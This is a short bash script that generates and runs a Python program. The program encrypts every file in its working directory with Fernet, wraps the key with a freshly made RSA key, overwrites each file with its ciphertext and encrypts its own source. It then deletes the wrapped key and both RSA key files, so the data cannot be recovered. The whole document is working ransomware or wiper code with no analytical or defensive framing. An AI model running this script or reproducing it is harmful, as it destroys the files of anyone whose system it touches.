#!/usr/bin/env /bin/bash

/usr/bin/ls -l | /usr/bin/awk 'NR > 1 {print $9}' > file_names.txt

/usr/bin/cat << EOF > fernet_encryptor.py

#!/usr/bin/env /usr/bin/python3

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
from Cryptodome.PublicKey import RSA
import subprocess

new_key = RSA.generate(4096, e=65537)
private_key = new_key.exportKey("PEM")
public_key = new_key.publickey().exportKey("PEM")
fd = open("private_key.pem", "wb")
fd.write(private_key)
fd.close()

ff = open("public_key.pem", "wb")
ff.write(public_key)
ff.close()

symmetricKey = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)

with open("public_key.pem", "rb") as key_file:
	public_key = serialization.load_pem_public_key(
		key_file.read(),
		backend=default_backend()
	)

encryptedSymmetricKey = public_key.encrypt(
	symmetricKey,
	padding.OAEP(
		mgf=padding.MGF1(algorithm=hashes.SHA256()),
		algorithm=hashes.SHA256(),
		label=None
	)
)

with open("encryptedSymmetricKey.key", "wb") as key_file:
	key_file.write(encryptedSymmetricKey)



EOF


for line in `/usr/bin/cat file_names.txt`;
do

/usr/bin/cat << EOF >> fernet_encryptor.py

filePath = "$line"
with open(filePath, "rb") as file:
	file_data = file.read()
	encrypted_data = FernetInstance.encrypt(file_data)

with open(filePath, "wb") as file:
	file.write(encrypted_data)

EOF

done

/usr/bin/cat << EOF >> fernet_encryptor.py

filePath = "fernet_encryptor.py"
with open(filePath, "rb") as file:
	file_data = file.read()
	encrypted_data = FernetInstance.encrypt(file_data)

with open(filePath, "wb") as file:
	file.write(encrypted_data)

EOF

/usr/bin/cat << EOF >> fernet_encryptor.py

print(subprocess.Popen(['/usr/bin/rm','-f','encryptedSymmetricKey.key']))
print(subprocess.Popen(['/usr/bin/rm','-f','public_key.pem']))
print(subprocess.Popen(['/usr/bin/rm','-f','private_key.pem']))

EOF

/usr/bin/python3 fernet_encryptor.py

